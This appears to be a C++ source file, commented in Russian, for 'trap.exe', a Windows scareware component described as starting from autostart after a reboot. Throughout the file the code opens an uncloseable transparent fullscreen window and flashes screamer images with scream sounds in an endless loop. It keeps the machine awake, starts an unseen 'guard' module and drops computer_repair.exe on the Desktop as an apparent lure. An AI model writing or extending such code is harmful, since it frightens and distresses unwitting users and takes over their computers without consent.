/*
 * trap.exe — запускается из автозагрузки после перезагрузки.
 * Показывает несколько скримеров ЗА РАЗ в случайных местах экрана
 * (не на весь экран), со случайными паузами и звуками,
 * копирует computer_repair.exe на Рабочий стол.
 *
 * Окно ВСЕГДА остаётся colorkey-прозрачным: фон под скримером заливается
 * COLOR_KEY_RGB и потому невидим (никакого розового полотна на весь экран).
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <cstdlib>
#include <string>
#include <vector>

#include "config.h"
#include "utils.h"
#include "guard.h"

using std::wstring;

static HINSTANCE g_hinst;
static HWND g_hwnd;
static HDC g_mdc = NULL;
static HBITMAP g_dib = NULL, g_old = NULL;
static int g_W = 0, g_H = 0;

static const wchar_t *SCREAM_BMP[3] = { L"face.bmp", L"skull.bmp", L"distort.bmp" };
static const wchar_t *SCREAM_WAV[3] = { L"scary1.wav", L"scary2.wav", L"scary3.wav" };

struct Screamer {
    HBITMAP imgA;
    HBITMAP imgB;
    int px, py, iw, ih;
};

static int rnd(int a, int b) { return a + rand() % (b - a + 1); }
static ULONGLONG nowms() { return GetTickCount64(); }

static LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_PAINT: {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        BitBlt(dc, 0, 0, g_W, g_H, g_mdc, 0, 0, SRCCOPY);
        EndPaint(h, &ps);
        return 0;
    }
    case WM_ERASEBKGND:
        return 1;
    case WM_CLOSE:
        return 0;
    case WM_SYSCOMMAND:
        if (w == SC_CLOSE) return 0;
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(h, m, w, l);
}

static void present() {
    HDC dc = GetDC(g_hwnd);
    BitBlt(dc, 0, 0, g_W, g_H, g_mdc, 0, 0, SRCCOPY);
    ReleaseDC(g_hwnd, dc);
}

/* без прокачки сообщений Windows объявляет окно «не отвечает» и рисует
 * призрак-снимок — выглядит как зависание после первого скримера */
static void pump_messages() {
    MSG m;
    while (PeekMessageW(&m, NULL, 0, 0, PM_REMOVE)) {
        if (m.message == WM_QUIT) ExitProcess(0);
        TranslateMessage(&m);
        DispatchMessageW(&m);
    }
}

static void copy_repair_to_desktop() {
    wstring src = util::join(util::app_dir(), REPAIR_EXE_NAME);
    wstring dst = util::join(util::desktop_dir(), REPAIR_EXE_NAME);
    if (util::file_exists(src)) {
        util::copy_file(src, dst);
        SetFileAttributesW(dst.c_str(), FILE_ATTRIBUTE_NORMAL);
    }
}

/* Заглушка, если resources\screamers не найдены: рисуем страшную морду сами,
 * чтобы trap никогда не превращался в молчащий чёрный экран. */
static void draw_fallback_face(int px, int py, int iw, int ih) {
    HBRUSH bg = CreateSolidBrush(RGB(8, 0, 0));
    RECT r = {px, py, px + iw, py + ih};
    FillRect(g_mdc, &r, bg);
    DeleteObject(bg);

    HBRUSH red = CreateSolidBrush(RGB(140, 10, 10));
    HGDIOBJ o = SelectObject(g_mdc, red);
    Ellipse(g_mdc, px + iw / 8, py + ih / 10, px + iw - iw / 8, py + ih - ih / 10);
    SelectObject(g_mdc, o);
    DeleteObject(red);

    HBRUSH white = CreateSolidBrush(RGB(255, 240, 240));
    o = SelectObject(g_mdc, white);
    Ellipse(g_mdc, px + iw * 22 / 100, py + ih * 30 / 100,
            px + iw * 40 / 100, py + ih * 46 / 100);
    Ellipse(g_mdc, px + iw * 60 / 100, py + ih * 30 / 100,
            px + iw * 78 / 100, py + ih * 46 / 100);
    SelectObject(g_mdc, o);
    DeleteObject(white);

    HBRUSH black = CreateSolidBrush(RGB(0, 0, 0));
    o = SelectObject(g_mdc, black);
    Ellipse(g_mdc, px + iw * 27 / 100, py + ih * 35 / 100,
            px + iw * 34 / 100, py + ih * 44 / 100);
    Ellipse(g_mdc, px + iw * 66 / 100, py + ih * 35 / 100,
            px + iw * 73 / 100, py + ih * 44 / 100);
    SelectObject(g_mdc, o);
    DeleteObject(black);

    HPEN pen = CreatePen(PS_SOLID, (iw / 40 < 3) ? 3 : iw / 40, RGB(180, 20, 20));
    o = SelectObject(g_mdc, pen);
    MoveToEx(g_mdc, px + iw * 25 / 100, py + ih * 65 / 100, NULL);
    for (int k = 0; k <= 6; k++) {
        int x = px + iw * (25 + k * 8) / 100;
        int y = py + ih * ((k % 2) ? 75 : 65) / 100;
        LineTo(g_mdc, x, y);
    }
    SelectObject(g_mdc, o);
    DeleteObject(pen);
}

static void fill_key_color() {
    HBRUSH br = CreateSolidBrush(COLOR_KEY_RGB);
    RECT r = {0, 0, g_W, g_H};
    FillRect(g_mdc, &r, br);
    DeleteObject(br);
}

/* случайные размер и позиция скримера (НЕ на весь экран) */
static void place_screamer(Screamer &s) {
    int iw = rnd((int)(g_W * 0.30), (int)(g_W * 0.55));
    int ih = iw * 3 / 4;                  /* исходник 480x360 */
    int maxH = (int)(g_H * 0.65);
    if (ih > maxH) {
        ih = maxH;
        iw = ih * 4 / 3;
    }
    if (iw > g_W) iw = g_W;
    if (ih > g_H) ih = g_H;
    s.iw = iw;
    s.ih = ih;
    s.px = rnd(0, g_W - s.iw);
    s.py = rnd(0, g_H - s.ih);
}

static void draw_screamer(const Screamer &s, bool frameB) {
    HBITMAP img = frameB ? s.imgB : s.imgA;
    HDC idc = CreateCompatibleDC(g_mdc);
    if (img) {
        HGDIOBJ io = SelectObject(idc, img);
        SetStretchBltMode(g_mdc, COLORONCOLOR);
        StretchBlt(g_mdc, s.px, s.py, s.iw, s.ih, idc, 0, 0, 480, 360, SRCCOPY);
        SelectObject(idc, io);
    } else {
        draw_fallback_face(s.px, s.py, s.iw, s.ih);
    }
    DeleteDC(idc);
}

int WINAPI WinMain(HINSTANCE hinst, HINSTANCE, LPSTR, int) {
    g_hinst = hinst;
    srand((unsigned)GetTickCount());

    if (!win::init_fullscreen(hinst, WINDOW_CLASS, WINDOW_TITLE, WndProc, &g_hwnd, &g_W, &g_H))
        return 1;
    if (!win::create_back_buffer(&g_mdc, &g_dib, &g_old, g_W, g_H))
        return 1;

    copy_repair_to_desktop();
    guard_start();
    SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED);

    wstring exd = util::app_dir();

    for (;;) {
        /* волна: несколько скримеров сразу, каждый в своём месте экрана */
        int count = rnd(SCRIMER_COUNT_MIN, SCRIMER_COUNT_MAX);
        if (count < 1) count = 1;
        std::vector<Screamer> list(count);
        int wavIdx = rnd(0, 2);

        for (int i = 0; i < count; i++) {
            Screamer &s = list[i];
            int idx = rnd(0, 2);
            int idx2 = (idx + 1) % 3;
            wstring dirA = util::join(util::join(exd, SCREAMERS_SUBDIR), SCREAM_BMP[idx]);
            wstring dirB = util::join(util::join(exd, SCREAMERS_SUBDIR), SCREAM_BMP[idx2]);
            s.imgA = util::load_bmp(dirA);
            s.imgB = util::load_bmp(dirB);
            place_screamer(s);
        }

        util::play_wav_async(util::join(util::join(exd, SOUNDS_SUBDIR), SCREAM_WAV[wavIdx]));

        /* кадры мигают на местах, фон под ними — прозрачный colorkey */
        ULONGLONG start = nowms();
        bool frameB = false;
        while (nowms() - start < SCRIMER_HOLD_MS) {
            pump_messages();
            fill_key_color();
            for (int i = 0; i < count; i++)
                draw_screamer(list[i], frameB);
            present();
            frameB = !frameB;
            Sleep(SCRIMER_FLICKER_MS);
        }

        for (int i = 0; i < count; i++) {
            if (list[i].imgA) DeleteObject(list[i].imgA);
            if (list[i].imgB) DeleteObject(list[i].imgB);
        }

        fill_key_color();
        present();
        /* пауза между волнами: спим короткими кусочками и качаем сообщения */
        ULONGLONG pauseEnd = nowms() + (ULONGLONG)rnd(SCRIMER_PAUSE_MIN_MS, SCRIMER_PAUSE_MAX_MS);
        while (nowms() < pauseEnd) {
            pump_messages();
            Sleep(100);
        }
    }

    guard_stop();
    SelectObject(g_mdc, g_old);
    DeleteObject(g_dib);
    DeleteDC(g_mdc);
    return 0;
}
